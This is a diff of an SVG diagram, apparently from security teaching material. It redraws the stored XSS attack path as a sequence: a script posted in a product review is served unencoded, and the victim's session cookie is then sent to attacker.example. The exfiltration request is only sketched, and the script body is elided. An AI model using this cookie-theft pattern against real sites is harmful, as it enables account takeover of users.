@@ -1,85 +1,49 @@
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1320 280" width="1320" height="280" font-family="'Space Grotesk','Segoe UI',system-ui,sans-serif">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1040 564" width="1040" height="564" font-family="'Space Grotesk','Segoe UI',system-ui,sans-serif">
   <defs>
-    <pattern id="grid" width="24" height="24" patternUnits="userSpaceOnUse">
-      <path d="M24 0H0V24" fill="none" stroke="#21262d" stroke-width="1" opacity="0.5"/>
-    </pattern>
-    <marker id="arrow" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth">
-      <path d="M0,0 L7,3 L0,6 Z" fill="#8b949e"/>
-    </marker>
-    <marker id="arrow-green" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth">
-      <path d="M0,0 L7,3 L0,6 Z" fill="#4ade80"/>
-    </marker>
+    <pattern id="grid" width="24" height="24" patternUnits="userSpaceOnUse"><path d="M24 0H0V24" fill="none" stroke="#21262d" stroke-width="1" opacity="0.5"/></pattern>
+    <marker id="ar" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#8b949e"/></marker>
+    <marker id="arRed" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#f85149"/></marker>
+    <marker id="arAmber" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#d29922"/></marker>
   </defs>
-
-  <!-- canvas -->
-  <rect x="0" y="0" width="1320" height="280" fill="#0d1117"/>
-  <rect x="0" y="0" width="1320" height="280" fill="url(#grid)"/>
-
-  <!-- title -->
-  <text x="22" y="40" font-size="13" font-family="'JetBrains Mono',monospace" fill="#00caff" letter-spacing="1">&gt;_</text>
-  <text x="50" y="42" font-size="20" font-weight="700" fill="#e6edf3">Stored XSS (Server-Side) - Attack Path</text>
-
-  <!-- legend -->
-  <circle cx="852" cy="36" r="5" fill="#f85149"/>
-  <text x="864" y="40" font-size="12" fill="#8b949e">vulnerable step</text>
-  <circle cx="992" cy="36" r="5" fill="#f97316"/>
-  <text x="1004" y="40" font-size="12" fill="#8b949e">impact</text>
-  <circle cx="1092" cy="36" r="5" fill="#4ade80"/>
-  <text x="1104" y="40" font-size="12" fill="#8b949e">goal</text>
-
-  <!-- edges (drawn first, under the nodes) -->
-  <g stroke-width="1.5">
-    <line x1="160" y1="162" x2="179" y2="162" stroke="#8b949e" marker-end="url(#arrow)"/>
-    <line x1="322" y1="162" x2="341" y2="162" stroke="#8b949e" marker-end="url(#arrow)"/>
-    <line x1="484" y1="162" x2="503" y2="162" stroke="#8b949e" stroke-dasharray="4 3" marker-end="url(#arrow)"/>
-    <line x1="646" y1="162" x2="665" y2="162" stroke="#f85149" marker-end="url(#arrow)"/>
-    <line x1="808" y1="162" x2="827" y2="162" stroke="#f97316" marker-end="url(#arrow)"/>
-    <line x1="970" y1="162" x2="989" y2="162" stroke="#8b949e" marker-end="url(#arrow)"/>
-    <line x1="1132" y1="162" x2="1151" y2="162" stroke="#4ade80" marker-end="url(#arrow-green)"/>
-  </g>
-  <!-- "stored, waits" note over the dashed edge -->
-  <text x="493" y="146" text-anchor="middle" font-size="9.5" font-family="'JetBrains Mono',monospace" fill="#6e7681">stored ·</text>
-  <text x="493" y="186" text-anchor="middle" font-size="9.5" font-family="'JetBrains Mono',monospace" fill="#6e7681">waits</text>
-
-  <!-- n0 Attacker -->
-  <rect x="20" y="120" width="140" height="84" rx="6" fill="#161b22" stroke="#00caff" stroke-width="1.5"/>
-  <text x="90" y="167" text-anchor="middle" font-size="14" font-weight="700" fill="#5cd6f7">Attacker</text>
-
-  <!-- n1 Post payload -->
-  <rect x="182" y="120" width="140" height="84" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
-  <text x="252" y="154" text-anchor="middle" font-size="12.5" font-weight="600" fill="#e6edf3">1. Post payload</text>
-  <text x="252" y="177" text-anchor="middle" font-size="11" fill="#8b949e">in a review</text>
-
-  <!-- n2 Server stores -->
-  <rect x="344" y="120" width="140" height="84" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
-  <text x="414" y="154" text-anchor="middle" font-size="12.5" font-weight="600" fill="#e6edf3">2. Server stores</text>
-  <text x="414" y="177" text-anchor="middle" font-size="11" fill="#8b949e">it in the database</text>
-
-  <!-- n3 Victim opens -->
-  <rect x="506" y="120" width="140" height="84" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
-  <text x="576" y="154" text-anchor="middle" font-size="12.5" font-weight="600" fill="#e6edf3">3. Victim opens</text>
-  <text x="576" y="177" text-anchor="middle" font-size="11" fill="#8b949e">the page (logged-in)</text>
-
-  <!-- n4 Served UNENCODED (vulnerable) -->
-  <rect x="668" y="120" width="140" height="84" rx="6" fill="#1c2128" stroke="#f85149" stroke-width="2"/>
-  <text x="738" y="154" text-anchor="middle" font-size="12.5" font-weight="600" fill="#e6edf3">4. Served to all</text>
-  <text x="738" y="178" text-anchor="middle" font-size="12.5" font-weight="700" fill="#ff6b6b" letter-spacing="0.5">UNENCODED</text>
-
-  <!-- n5 Script runs (impact) -->
-  <rect x="830" y="120" width="140" height="84" rx="6" fill="#161b22" stroke="#f97316" stroke-width="1.5"/>
-  <text x="900" y="154" text-anchor="middle" font-size="12.5" font-weight="600" fill="#e6edf3">5. Script runs in</text>
-  <text x="900" y="177" text-anchor="middle" font-size="11" fill="#8b949e">victim's browser</text>
-
-  <!-- n6 Exfiltrate -->
-  <rect x="992" y="120" width="140" height="84" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
-  <text x="1062" y="154" text-anchor="middle" font-size="12.5" font-weight="600" fill="#e6edf3">6. Session sent to</text>
-  <text x="1062" y="177" text-anchor="middle" font-size="11" fill="#8b949e">attacker server</text>
-
-  <!-- n7 Goal -->
-  <rect x="1154" y="120" width="140" height="84" rx="6" fill="#161b22" stroke="#4ade80" stroke-width="2"/>
-  <text x="1224" y="154" text-anchor="middle" font-size="11.5" font-weight="700" fill="#4ade80">7. Account takeover</text>
-  <text x="1224" y="177" text-anchor="middle" font-size="11" fill="#8b949e">hits every viewer</text>
-
-  <!-- caption -->
-  <text x="22" y="252" font-size="12.5" fill="#6e7681">The payload is stored once and served unencoded to everyone who loads the page; each viewer's browser executes it in their own session - no per-victim link required.</text>
+  <rect x="0" y="0" width="1040" height="564" fill="#0d1117"/>
+  <rect x="0" y="0" width="1040" height="564" fill="url(#grid)"/>
+  <text x="22" y="34" font-size="13" font-family="'JetBrains Mono',monospace" fill="#00caff" letter-spacing="1">&gt;_</text>
+  <text x="50" y="36" font-size="19" font-weight="700" fill="#e6edf3">Stored XSS (Server-Side) - Attack Path</text>
+  <line x1="892" y1="20" x2="916" y2="20" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ar)"/>
+  <text x="922" y="24" font-size="11" fill="#8b949e">request</text>
+  <line x1="892" y1="38" x2="916" y2="38" stroke="#8b949e" stroke-width="1.5" stroke-dasharray="5 3" marker-end="url(#ar)"/>
+  <text x="922" y="42" font-size="11" fill="#8b949e">response</text>
+  <line x1="892" y1="56" x2="916" y2="56" stroke="#f85149" stroke-width="1.5" marker-end="url(#arRed)"/>
+  <text x="922" y="60" font-size="11" fill="#ff6b6b">vulnerable step</text>
+  <line x1="150" y1="110" x2="150" y2="488" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4 5"/>
+  <line x1="480" y1="110" x2="480" y2="488" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4 5"/>
+  <line x1="800" y1="110" x2="800" y2="488" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4 5"/>
+  <rect x="75" y="64" width="150" height="46" rx="6" fill="#161b22" stroke="#00caff" stroke-width="1.5"/>
+  <text x="150" y="87" text-anchor="middle" font-size="14" font-weight="700" fill="#5cd6f7">Attacker</text>
+  <text x="150" y="101" text-anchor="middle" font-size="9" font-family="'JetBrains Mono',monospace" fill="#8b949e">attacker.example</text>
+  <rect x="405" y="64" width="150" height="46" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
+  <text x="480" y="87" text-anchor="middle" font-size="14" font-weight="700" fill="#e6edf3">Victim</text>
+  <text x="480" y="101" text-anchor="middle" font-size="9" font-family="'JetBrains Mono',monospace" fill="#8b949e">logged-in user</text>
+  <rect x="725" y="64" width="150" height="46" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
+  <text x="800" y="87" text-anchor="middle" font-size="14" font-weight="700" fill="#e6edf3">Server</text>
+  <text x="800" y="101" text-anchor="middle" font-size="9" font-family="'JetBrains Mono',monospace" fill="#8b949e">shop.example</text>
+  <text x="480" y="134" text-anchor="middle" font-size="9.5" font-style="italic" fill="#6e7681">logged in to shop.example, session cookie readable by JS</text>
+  <text x="475" y="147" text-anchor="middle" font-size="11" fill="#e6edf3">1. POST /review (stored)</text>
+  <text x="475" y="159" text-anchor="middle" font-size="9.5" font-family="'JetBrains Mono',monospace" fill="#a0e9ff">body=&lt;script&gt;...&lt;/script&gt;</text>
+  <line x1="158" y1="166" x2="792" y2="166" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ar)"/>
+  <text x="812" y="162" font-size="9" font-family="'JetBrains Mono',monospace" fill="#8b949e">saved to the database</text>
+  <text x="800" y="224" text-anchor="middle" font-size="9" font-style="italic" font-family="'JetBrains Mono',monospace" fill="#6e7681">stored once, then served to every viewer</text>
+  <text x="640" y="229" text-anchor="middle" font-size="11" fill="#e6edf3">2. GET /product (views the page)</text>
+  <text x="640" y="241" text-anchor="middle" font-size="9.5" font-family="'JetBrains Mono',monospace" fill="#a0e9ff">Cookie: session=...</text>
+  <line x1="488" y1="248" x2="792" y2="248" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ar)"/>
+  <text x="640" y="299" text-anchor="middle" font-size="11" fill="#e6edf3">3. 200 OK: stored review served UNENCODED</text>
+  <line x1="792" y1="306" x2="488" y2="306" stroke="#f85149" stroke-width="2" stroke-dasharray="5 3" marker-end="url(#arRed)"/>
+  <text x="812" y="302" font-size="9" font-family="'JetBrains Mono',monospace" fill="#8b949e">no output encoding</text>
+  <rect x="340" y="356" width="280" height="38" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
+  <text x="480" y="380" text-anchor="middle" font-size="10.5" font-weight="600" fill="#e6edf3">browser runs the stored &lt;script&gt;</text>
+  <text x="315" y="407" text-anchor="middle" font-size="11" fill="#e6edf3">4. GET attacker.example/?c=...</text>
+  <text x="315" y="419" text-anchor="middle" font-size="9.5" font-family="'JetBrains Mono',monospace" fill="#a0e9ff">c = document.cookie (session)</text>
+  <line x1="472" y1="426" x2="158" y2="426" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ar)"/>
+  <text x="22" y="514" font-size="12.5" fill="#6e7681">The payload is stored once and served unencoded to everyone who loads the page, so it runs in each viewer's session.</text>
+  <text x="22" y="532" font-size="12.5" fill="#6e7681">A single poisoned record leads to <tspan fill="#4ade80" font-weight="700">account takeover</tspan> for every viewer.</text>
 </svg>
